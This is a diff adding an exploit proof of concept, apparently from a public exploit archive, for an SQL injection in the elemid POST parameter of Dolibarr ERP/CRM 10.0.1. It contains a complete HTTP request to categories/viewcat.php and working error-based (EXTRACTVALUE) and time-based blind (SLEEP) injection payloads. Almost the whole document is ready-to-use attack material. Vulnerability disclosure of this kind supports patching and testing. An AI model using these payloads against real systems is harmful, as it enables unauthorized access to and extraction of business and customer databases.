@@ -1,0 +1,49 @@
+# Exploit Title: Dolibarr ERP/CRM - elemid Sql Injection
+# Exploit Author: Metin Yunus Kandemir (kandemir)
+# Vendor Homepage: https://www.dolibarr.org/
+# Software Link: https://www.dolibarr.org/downloads
+# Version: 10.0.1
+# Category: Webapps
+# Tested on: Xampp for Linux
+# Software Description : Dolibarr ERP & CRM is a modern and easy to use
+software package to manage your business...
+==================================================================
+
+
+elemid (POST) - Sql injection PoC
+
+
+POST /dolibarr-10.0.1/htdocs/categories/viewcat.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/dolibarr-10.0.1/htdocs/categories/viewcat.php?id=102&type=product&backtopage=%2Fdolibarr-10.0.1%2Fhtdocs%2Fcategories%2Findex.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Cookie:
+DOLSESSID_60ec554596b730ca6f03816d85cd400a=149432620a831537e75f713330bb0b45
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+token=%242y%2410%24WgwCdl0XwjnGlV3qpQ%2F7zeLEp%2FXFVVoWaj17gXqY2nYZFvG1dlzsS&typeid=product&type=product&id=102&action=addintocategory&elemid=[SQLi]
+
+
+
+Parameter: elemid (POST)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (EXTRACTVALUE)
+    Payload:
+token=$2y$10$WgwCdl0XwjnGlV3qpQ/7zeLEp/XFVVoWaj17gXqY2nYZFvG1dlzsS&typeid=product&type=product&id=102&action=addintocategory&elemid=0
+AND EXTRACTVALUE(7549,CONCAT(0x5c,0x71706a7171,(SELECT
+(ELT(7549=7549,1))),0x7176787a71))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload:
+token=$2y$10$WgwCdl0XwjnGlV3qpQ/7zeLEp/XFVVoWaj17gXqY2nYZFvG1dlzsS&typeid=product&type=product&id=102&action=addintocategory&elemid=0
+AND (SELECT 6353 FROM (SELECT(SLEEP(5)))aOzn)
